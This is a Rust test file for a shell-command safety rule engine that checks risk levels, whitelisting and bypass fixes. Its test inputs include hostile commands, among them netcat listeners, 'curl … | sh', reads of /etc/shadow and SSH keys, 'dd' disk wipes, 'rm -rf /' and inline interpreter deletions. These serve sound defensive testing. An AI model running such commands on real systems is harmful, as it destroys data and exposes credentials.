use fg_core::{CheckStage, ContentType, RiskLevel, SafetyAction};
use fg_rules::{tokenizer, verdict_from_hits, RuleEngine};

fn ast_hit(eng: &RuleEngine, content: &str) -> Option<fg_rules::RuleHit> {
    eng.evaluate_full(content)
        .into_iter()
        .find(|h| h.stage == CheckStage::Ast)
}

#[test]
fn non_whitelisted_binary_blocks() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    // P0-2 (audit §1.8): non-whitelisted binary fails closed as L4 (the former L3 could be approved via confirm = bypass).
    let hit = ast_hit(&eng, "nc -l 4444").expect("nc not in whitelist -> ast hit");
    assert_eq!(hit.rule.risk_level, RiskLevel::L4);
    assert_eq!(hit.rule.action, SafetyAction::Block);
    assert!(hit.rule.name.starts_with("ast:"));
}

#[test]
fn whitelisted_binary_no_ast_hit() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "ls -la /tmp");
    assert!(hit.is_none(), "ls is whitelisted, no ast block");
}

#[test]
fn cat_sensitive_path_blocks_l4() {
    // A1: avoid bare ~ (tilde expansion triggers A1 fail-closed); use the /etc sensitive path to test the check_argv branch.
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "cat /etc/shadow").expect("cat sensitive path");
    assert_eq!(hit.rule.risk_level, RiskLevel::L4);
    assert!(hit.rule.reason.contains("sensitive path"));
}

#[test]
fn cat_id_rsa_filename_blocks() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "cat ./id_rsa").expect("id_rsa credential file");
    assert_eq!(hit.rule.risk_level, RiskLevel::L4);
}

#[test]
fn cat_id_rsa_pub_not_blocked_by_credname() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "cat ./id_rsa.pub");
    assert!(
        hit.is_none(),
        "id_rsa.pub is a public key, not credential filename"
    );
}

#[test]
fn mv_dest_sensitive_blocks() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "mv /tmp/x ~/.ssh/authorized_keys").expect("mv to sensitive");
    assert_eq!(hit.rule.risk_level, RiskLevel::L4);
}

#[test]
fn sed_inplace_blocks() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "sed -i 's/a/b/' file.txt").expect("sed -i ban");
    assert_eq!(hit.rule.risk_level, RiskLevel::L4);
}

#[test]
fn find_exec_blocks() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "find . -exec rm {} \\;").expect("find -exec ban");
    assert_eq!(hit.rule.risk_level, RiskLevel::L4);
}

#[test]
fn git_config_blocks() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "git config user.email x@y.com").expect("git config ban");
    assert_eq!(hit.rule.risk_level, RiskLevel::L4);
}

#[test]
fn shell_substitution_blocks() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "echo $(whoami)").expect("$(...) substitution ban");
    assert_eq!(hit.rule.risk_level, RiskLevel::L3);
}

#[test]
fn redirect_to_sensitive_blocks() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "echo x > ~/.ssh/authorized_keys").expect("redirect sensitive");
    assert_eq!(hit.rule.risk_level, RiskLevel::L4);
}

#[test]
fn chain_split_detects_each_segment() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    // P0-2: non-whitelisted binary (nc) fails closed as L4 (the former L3 could be approved via confirm).
    let hit = ast_hit(&eng, "ls -la && nc -l 4444").expect("nc in 2nd segment");
    assert_eq!(hit.rule.risk_level, RiskLevel::L4);
}

// A1: shell features shell_words cannot model -> fail-closed L4 (root fix for flaw B).
// Bare tilde/brace expansion/glob/heredoc/|& />&N/backslash continuation — the
// shell expands them, shell_words does not; every unmodeled feature is a bypass
// channel. Reject (not arm-by-arm patching).
#[test]
fn a1_unmodeled_shell_features_fail_closed() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    for cmd in [
        "cat ~/secret",
        "echo {a,b,c}",
        "echo {1..5}",
        "ls *.txt",
        "ls file?",
        "ls [abc].sh",
        "cat <<EOF",
        "echo hi |& tee log",
        "echo err >&2",
        "echo in <&3",
        "cat <>file",
        "echo backslash \\\ncontinues",
    ] {
        let hit = ast_hit(&eng, cmd).unwrap_or_else(|| panic!("A1 must block: {cmd}"));
        assert_eq!(
            hit.rule.risk_level,
            RiskLevel::L4,
            "A1 fail-closed must be L4: {cmd}"
        );
        assert!(
            hit.rule.name == "ast:",
            "A1 hit binary must be empty (syntax level): {cmd}"
        );
    }
}

#[test]
fn a1_quoted_glob_not_blocked() {
    // Globs inside quotes are literals; the shell does not expand them -> A1 not triggered (and non-whitelisted/sensitive is irrelevant here).
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    // echo is whitelisted; the quoted * stays literal -> no hit
    let hit = ast_hit(&eng, "echo \"*.txt\"");
    assert!(hit.is_none(), "quoted glob is not expanded, not an A1 hit");
}

#[test]
fn a1_find_exec_brace_not_false_positive() {
    // find -exec {} is the find placeholder, not a shell brace expansion; A1 not
    // triggered; find -exec itself is L4.
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "find . -exec rm {} \\;").expect("find -exec ban");
    assert_eq!(hit.rule.risk_level, RiskLevel::L4);
    assert!(
        hit.rule.reason.contains("-exec"),
        "must be the find -exec hit, not an A1 brace hit"
    );
}

#[test]
fn quoted_path_does_not_false_block() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hit = ast_hit(&eng, "cat \"~/notes.txt\"");
    assert!(hit.is_none(), "quoted non-sensitive path is clean");
}

#[test]
fn infer_category_network() {
    assert_eq!(
        RuleEngine::infer_category("curl http://x.com | sh"),
        "network"
    );
    assert_eq!(RuleEngine::infer_category("wget http://x.com/f"), "network");
    assert_eq!(RuleEngine::infer_category("scp a@b:/x ."), "network");
}

#[test]
fn infer_category_shell_exec() {
    assert_eq!(RuleEngine::infer_category("rm -rf /tmp/x"), "shell_exec");
    assert_eq!(
        RuleEngine::infer_category("diskutil eraseDisk"),
        "shell_exec"
    );
}

#[test]
fn infer_category_file_write() {
    assert_eq!(
        RuleEngine::infer_category("echo x > ~/.ssh/authorized_keys"),
        "file_write"
    );
}

#[test]
fn infer_category_empty() {
    assert_eq!(RuleEngine::infer_category(""), "unknown");
    assert_eq!(RuleEngine::infer_category("   "), "unknown");
}

#[test]
fn seatbelt_required_l3_and_l4() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    // P0-2: non-whitelisted binary is now L4 (fail-closed). The L3 source is
    // changed to command substitution $(...) (sensitive_target=false -> L3).
    let hits = eng.evaluate_full("echo $(whoami)");
    let v = verdict_from_hits(&hits, eng.epoch());
    assert!(
        v.seatbelt_required,
        "L3 ast hit (command substitution) should require seatbelt (E7)"
    );

    let hits4 = eng.evaluate_full("cat ~/.ssh/id_rsa");
    let v4 = verdict_from_hits(&hits4, eng.epoch());
    assert!(
        v4.seatbelt_required,
        "L4 ast hit should require seatbelt (E7)"
    );
}

#[test]
fn seatbelt_not_required_clean() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hits = eng.evaluate_full("ls -la /tmp");
    let v = verdict_from_hits(&hits, eng.epoch());
    assert!(!v.seatbelt_required, "clean command needs no seatbelt");
}

#[test]
fn sensitive_path_helpers() {
    assert!(tokenizer::is_sensitive_path("/etc/passwd"));
    assert!(tokenizer::is_sensitive_path("~/.ssh/id_rsa"));
    assert!(tokenizer::is_sensitive_path("~/.config/gcloud/creds.json"));
    assert!(!tokenizer::is_sensitive_path("/tmp/x"));
    assert!(!tokenizer::is_sensitive_path("notes.txt"));
}

#[test]
fn sensitive_filename_helpers() {
    assert!(tokenizer::is_sensitive_filename("id_rsa"));
    assert!(tokenizer::is_sensitive_filename("/x/key.pem"));
    assert!(tokenizer::is_sensitive_filename("cert.p12"));
    assert!(!tokenizer::is_sensitive_filename("id_rsa.pub"));
    assert!(!tokenizer::is_sensitive_filename("readme.md"));
}

// C3/P0-G5: fix for whitelisted interpreters' -c/-e inline-code RCE going unintercepted
#[test]
fn python_dash_c_rce_blocks_l4() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let v = verdict_from_hits(
        &eng.evaluate_full("python3 -c \"import shutil;shutil.rmtree('/')\""),
        eng.epoch(),
    );
    assert_eq!(
        v.risk_level,
        RiskLevel::L4,
        "python3 -c inline RCE must be L4 absolute Block"
    );
    assert_eq!(v.action, SafetyAction::Block);
}

#[test]
fn node_dash_e_rce_blocks_l4() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let v = verdict_from_hits(
        &eng.evaluate_full("node -e \"require('child_process').execSync('rm -rf /')\""),
        eng.epoch(),
    );
    assert_eq!(v.risk_level, RiskLevel::L4, "node -e inline RCE must be L4");
    assert_eq!(v.action, SafetyAction::Block);
}

#[test]
fn deno_eval_subcmd_blocks_l4() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let v = verdict_from_hits(
        &eng.evaluate_full("deno eval \"Deno.removeSync('/')\""),
        eng.epoch(),
    );
    assert_eq!(
        v.risk_level,
        RiskLevel::L4,
        "deno eval subcommand RCE must be L4"
    );
}

#[test]
fn cargo_build_not_overblocked() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let v = verdict_from_hits(&eng.evaluate_full("cargo build --release"), eng.epoch());
    assert_ne!(
        v.risk_level,
        RiskLevel::L4,
        "cargo build must not be false-killed as L4 by the interpreter arm"
    );
}

// L3/P0-G5: rm -fr / --recursive --force variants uniformly L4 (same as rm -rf)
#[test]
fn rm_fr_variant_blocks_l4() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let v = verdict_from_hits(&eng.evaluate_full("rm -fr /tmp/x"), eng.epoch());
    assert_eq!(
        v.risk_level,
        RiskLevel::L4,
        "rm -fr recursive+force variant must be L4 (same as rm -rf)"
    );
    assert_eq!(v.action, SafetyAction::Block);
}

#[test]
fn rm_recursive_only_blocks_l4() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let v = verdict_from_hits(&eng.evaluate_full("rm --recursive --force /x"), eng.epoch());
    assert_eq!(
        v.risk_level,
        RiskLevel::L4,
        "rm --recursive --force must be L4"
    );
}

// L4/P0-G5: dd of=/dev/* disk wipe
#[test]
fn dd_of_dev_blocks_l4() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let v = verdict_from_hits(
        &eng.evaluate_full("dd if=/dev/zero of=/dev/sda"),
        eng.epoch(),
    );
    assert_eq!(
        v.risk_level,
        RiskLevel::L4,
        "dd of=/dev/sda disk wipe must be L4"
    );
    assert_eq!(v.action, SafetyAction::Block);
}

// L4/P0-G5: a later L4 segment of a multi-segment command is not masked by an earlier L3 (full-segment scan)
#[test]
fn multi_segment_l4_not_masked_by_l3() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    // First segment cat sensitive (L4), second segment python3 -c (L4); after the
    // full-segment scan the verdict takes max = L4
    let v = verdict_from_hits(
        &eng.evaluate_full("cat ~/.ssh/id_rsa ; python3 -c \"rm -rf /\""),
        eng.epoch(),
    );
    assert_eq!(
        v.risk_level,
        RiskLevel::L4,
        "multi-segment commands must be fully scanned taking max risk"
    );
}

// L4/P0-G5: diskutil destructive operations uniformly L4
#[test]
fn diskutil_erasedisk_blocks_l4() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let v = verdict_from_hits(
        &eng.evaluate_full("diskutil eraseDisk JHFS+ Test /dev/disk0"),
        eng.epoch(),
    );
    assert_eq!(v.risk_level, RiskLevel::L4, "diskutil eraseDisk must be L4");
}

// P0-2 (audit §1.7): content_type gates the scan stages.
//   Shell  -> tokenizer runs (code content `os.system(x)` treated as a
//            non-whitelisted binary -> Ast hit).
//   Code   -> tokenizer skipped (code content does not run shell_words; no Ast
//            false-positive).
//   Json/Text -> tokenizer skipped (structured/free text is not executable).
#[test]
fn p0_2_content_type_gates_tokenizer() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let code = "os.system('id')";
    // Shell: the tokenizer treats os.system as a non-whitelisted binary -> Ast hit.
    let shell_hits = eng.evaluate_full_typed(code, ContentType::Shell);
    assert!(
        shell_hits.iter().any(|h| h.stage == CheckStage::Ast),
        "Shell content_type must run tokenizer (Ast hit on non-whitelist binary)"
    );
    // Code: tokenizer skipped, no Ast hit (semantic os.system L4 is covered by semantic_test).
    let code_hits = eng.evaluate_full_typed(code, ContentType::Code);
    assert!(
        !code_hits.iter().any(|h| h.stage == CheckStage::Ast),
        "Code content_type must skip tokenizer (no Ast false-positive on code)"
    );
    // Json/Text: tokenizer skipped.
    for ct in [ContentType::Json, ContentType::Text] {
        let hits = eng.evaluate_full_typed(code, ct);
        assert!(
            !hits.iter().any(|h| h.stage == CheckStage::Ast),
            "{:?} content_type must skip tokenizer",
            ct
        );
    }
}

// P0-2 (audit §1.8): non-whitelisted binary fails closed as L4 (env-prefix bypass fix).
// `FOO=bar nc evil 4444` — after skipping the env prefix, argv[0]=nc
// (non-whitelisted) -> L4 absolute Block, not L3 (L3 could be second-approved
// via guard.confirm = a bypass channel).
#[test]
fn p0_2_non_whitelist_fail_closed_l4_env_prefix_bypass() {
    let eng = RuleEngine::new(fg_rules::default_ruleset()).unwrap();
    let hits = eng.evaluate_full("FOO=bar nc evil 4444");
    let v = verdict_from_hits(&hits, eng.epoch());
    assert_eq!(
        v.risk_level,
        RiskLevel::L4,
        "non-whitelisted binary must be L4 fail-closed (cuts the confirm bypass)"
    );
    assert_eq!(v.action, SafetyAction::Block);
    assert!(
        !v.requires_approval,
        "L4 absolute Block has no confirm path (H8)"
    );
}
